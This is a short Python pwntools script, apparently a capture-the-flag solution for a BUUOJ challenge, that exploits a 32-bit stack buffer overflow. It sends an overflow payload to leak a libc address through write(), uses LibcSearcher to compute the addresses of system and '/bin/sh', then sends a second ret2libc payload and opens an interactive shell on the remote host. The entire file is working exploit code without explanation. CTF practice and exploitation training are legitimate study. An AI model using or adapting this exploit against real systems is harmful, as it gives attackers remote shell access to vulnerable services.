from pwn import *
from LibcSearcher import *
context.log_level='debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 26419)
elf = ELF('./pwn')
# libc = ELF('libc32')

payload = cyclic(0x8c) + p32(elf.symbols['write']) + p32(elf.symbols['vulnerable_function'])
payload += p32(1) + p32(elf.got['read']) + p32(24)

io.sendline(payload)
io.recv(16)
write = u32(io.recv(4))
print(hex(write))

libc = LibcSearcher('write', write)
base = write - libc.dump('write')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

# base = write - libc.symbols['write']
# sys = base + libc.symbols['system']
# binsh = base + next(libc.search(b'/bin/sh'))
print(hex(base))
print(hex(sys))
print(hex(binsh))

payload = cyclic(0x8c) + p32(sys) + p32(binsh) + p32(binsh)
io.sendline(payload)

io.interactive()